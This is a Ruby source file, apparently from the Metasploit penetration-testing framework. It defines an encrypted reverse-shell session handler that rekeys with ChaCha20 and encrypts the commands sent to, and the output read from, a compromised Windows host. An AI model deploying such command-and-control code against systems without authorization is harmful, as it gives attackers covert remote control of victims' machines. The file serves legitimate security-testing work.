# -*- coding: binary -*-
require 'msf/base'

module Msf
module Sessions

class EncryptedShell < Msf::Sessions::CommandShell

  include Msf::Session::Basic
  include Msf::Session::Provider::SingleCommandShell

  attr_accessor :arch
  attr_accessor :platform

  attr_accessor :iv
  attr_accessor :key

  def initialize(rstream, opts={})
    self.arch ||= ""
    self.platform = "windows"
    datastore = opts[:datastore]
    block_count = "\x01\x00\x00\x00"
    @key = datastore['ChachaKey']
    @iv = block_count + datastore['ChachaNonce']

    new_key = Rex::Text.rand_text_alphanumeric(32)
    new_nonce = Rex::Text.rand_text_alphanumeric(12)
    new_cipher = Rex::Crypto.chacha_encrypt(@key, @iv, new_nonce + new_key)
    rstream.write(new_cipher)

    @key = new_key
    @iv = block_count + new_nonce
    super
  end

  def type
    "Encrypted"
  end

  def desc
    "Encrypted reverse shell"
  end

  def self.type
    self.class.type = "Encrypted"
  end

  ##
  # Overridden from Msf::Sessions::CommandShell#shell_read
  #
  # Read encrypted data from console and decrypt it
  #
  def shell_read(length=-1, timeout=1)
    rv = rstream.get_once(length, timeout)
    decrypted = Rex::Crypto.chacha_decrypt(@key, @iv, rv)
    framework.events.on_session_output(self, decrypted) if decrypted
    return decrypted
  rescue ::Rex::SocketError, ::EOFError, ::IOError, ::Errno::EPIPE => e
    shell_close
    raise e
  end

  ##
  # Overridden from Msf::Sessions::CommandShell#shell_write
  # 
  # Encrypt data then write it to the console
  #
  def shell_write(buf)
    return unless buf

    framework.events.on_session_command(self, buf.strip)
    encrypted = Rex::Crypto.chacha_encrypt(@key, @iv, buf)
    rstream.write(encrypted)
  rescue ::Rex::SocketError, ::EOFError, ::IOError, ::Errno::EPIPE => e
    shell_close
    raise e
  end

  undef_method :process_autoruns

end
end
end
